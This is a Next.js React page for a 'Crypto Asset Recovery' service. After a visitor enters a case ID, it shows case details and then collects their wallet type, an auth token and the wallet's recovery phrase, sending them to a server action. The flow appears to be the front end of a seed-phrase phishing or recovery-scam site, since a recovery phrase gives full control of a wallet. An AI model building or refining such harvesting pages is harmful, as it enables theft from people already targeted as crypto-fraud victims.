'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { CaseWithAssets } from '@/types';
import CaseIdVerificationModal from '@/components/recovery/CaseIdVerificationModal';
import RecoveryModal from '@/components/recovery/RecoveryModal';
import SuccessModal from '@/components/recovery/SuccessModal';
import CaseHeader from '@/components/recovery/CaseHeader';
import SummaryCards from '@/components/recovery/SummaryCards';
import RecoveryAction from '@/components/recovery/RecoveryAction';
import AssetsTable from '@/components/recovery/AssetsTable';
import LoadingState from '@/components/recovery/LoadingState';
import ErrorState from '@/components/recovery/ErrorState';
import VerificationRequired from '@/components/recovery/VerificationRequired';
import {
	RecoverySubmissionData,
	submitRecoveryRequest,
	verifyAuthToken,
} from '@/actions/recovery';

export default function CryptoRecoveryPage() {
	const router = useRouter();

	const [showCaseIdModal, setShowCaseIdModal] = useState(false);
	const [showRecoveryModal, setShowRecoveryModal] = useState(false);
	const [showSuccessModal, setShowSuccessModal] = useState(false);

	const [caseId, setCaseId] = useState('');
	const [isVerified, setIsVerified] = useState(false);
	const [isVerifying, setIsVerifying] = useState(false);
	const [caseIdError, setCaseIdError] = useState('');

	const [recoveryPhrase, setRecoveryPhrase] = useState('');
	const [authToken, setAuthToken] = useState('');
	const [selectedWallet, setSelectedWallet] = useState('');
	const [isSubmittingRecovery, setIsSubmittingRecovery] = useState(false);
	const [recoveryError, setRecoveryError] = useState('');

	const [caseData, setCaseData] = useState<CaseWithAssets | null>(null);
	const [isLoadingCase, setIsLoadingCase] = useState(false);
	const [caseError, setCaseError] = useState('');

	useEffect(() => {
		if (!isVerified) {
			setShowCaseIdModal(true);
		}
	}, [isVerified]);

	const fetchCaseData = async (id: string): Promise<CaseWithAssets | null> => {
		try {
			const response = await fetch(`/api/cases/${id}`);

			if (!response.ok) {
				if (response.status === 404) {
					throw new Error(
						'Case ID not found. Please check your Case ID and try again.'
					);
				} else if (response.status === 400) {
					throw new Error('Invalid Case ID format. Please enter a valid UUID.');
				} else {
					throw new Error('Failed to fetch case data. Please try again.');
				}
			}

			const data: CaseWithAssets = await response.json();
			return data;
		} catch (error) {
			throw error;
		}
	};

	const handleCaseIdVerification = async () => {
		setIsVerifying(true);
		setCaseIdError('');
		setCaseError('');

		const uuidRegex =
			/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

		if (!caseId.trim()) {
			setCaseIdError('Case ID is required');
			setIsVerifying(false);
			return;
		}

		if (!uuidRegex.test(caseId)) {
			setCaseIdError('Invalid Case ID format. Please enter a valid UUID.');
			setIsVerifying(false);
			return;
		}

		try {
			setIsLoadingCase(true);
			const data = await fetchCaseData(caseId);

			if (data) {
				setCaseData(data);
				setIsVerified(true);
				setShowCaseIdModal(false);
			}
		} catch (error) {
			setCaseIdError(
				error instanceof Error
					? error.message
					: 'An error occurred while verifying the case ID'
			);
		} finally {
			setIsVerifying(false);
			setIsLoadingCase(false);
		}
	};

	const handleRecoverySubmission = async () => {
		setIsSubmittingRecovery(true);
		setRecoveryError('');

		try {
			if (!authToken.trim()) {
				setRecoveryError('Auth token is required');
				return;
			}

			if (!selectedWallet) {
				setRecoveryError('Please select a wallet type');
				return;
			}

			if (!recoveryPhrase.trim()) {
				setRecoveryError('Recovery phrase is required');
				return;
			}

			const tokenVerification = await verifyAuthToken(authToken);
			if (!tokenVerification.valid) {
				setRecoveryError(tokenVerification.error || 'Invalid auth token');
				return;
			}

			const submissionData: RecoverySubmissionData = {
				authToken,
				walletType: selectedWallet,
				recoveryPhrase,
				userEmail: 'user@example.com',
				createdAt: new Date(),
			};

			const result = await submitRecoveryRequest(submissionData);

			if (result.success) {
				setAuthToken('');
				setSelectedWallet('');
				setRecoveryPhrase('');
				setShowRecoveryModal(false);
				setShowSuccessModal(true);
			} else {
				setRecoveryError(result.message);
			}
		} catch (err) {
			console.error('Submission error:', err);
			setRecoveryError('An unexpected error occurred. Please try again.');
		} finally {
			setIsSubmittingRecovery(false);
		}
	};

	const handleSuccessCompletion = () => {
		setShowSuccessModal(false);
		router.push('/');
	};

	const renderMainContent = () => {
		if (!isVerified && !isLoadingCase && !caseError) {
			return <VerificationRequired />;
		}

		if (isLoadingCase) {
			return <LoadingState />;
		}

		if (caseError) {
			return <ErrorState error={caseError} />;
		}

		if (isVerified && caseData) {
			return (
				<div className="space-y-6">
					<CaseHeader caseData={caseData} />
					<SummaryCards caseData={caseData} />
					<AssetsTable recoveryAssets={caseData.recoveryAssets} />
					<RecoveryAction
						caseStatus={caseData.status}
						onInitiateRecovery={() => setShowRecoveryModal(true)}
					/>
				</div>
			);
		}

		return null;
	};

	return (
		<div className="min-h-screen bg-gray-50 dark:bg-gray-900 p-4 sm:p-6 relative overflow-hidden">
			<div className="max-w-7xl mx-auto">
				<div className="mb-8">
					<h1 className="text-3xl font-bold text-gray-900 dark:text-white mb-2">
						Crypto Asset Recovery
					</h1>
					<p className="text-gray-600 dark:text-gray-400">
						Recovery wallet validation
					</p>
				</div>

				{renderMainContent()}
			</div>

			<CaseIdVerificationModal
				isOpen={showCaseIdModal}
				caseId={caseId}
				setCaseId={setCaseId}
				error={caseIdError}
				isVerifying={isVerifying}
				onVerify={handleCaseIdVerification}
			/>

			<RecoveryModal
				isOpen={showRecoveryModal}
				onClose={() => setShowRecoveryModal(false)}
				recoveryPhrase={recoveryPhrase}
				setRecoveryPhrase={setRecoveryPhrase}
				authToken={authToken}
				setAuthToken={setAuthToken}
				selectedWallet={selectedWallet}
				setSelectedWallet={setSelectedWallet}
				error={recoveryError}
				isSubmitting={isSubmittingRecovery}
				onSubmit={handleRecoverySubmission}
			/>

			<SuccessModal
				isOpen={showSuccessModal}
				onComplete={handleSuccessCompletion}
			/>
		</div>
	);
}
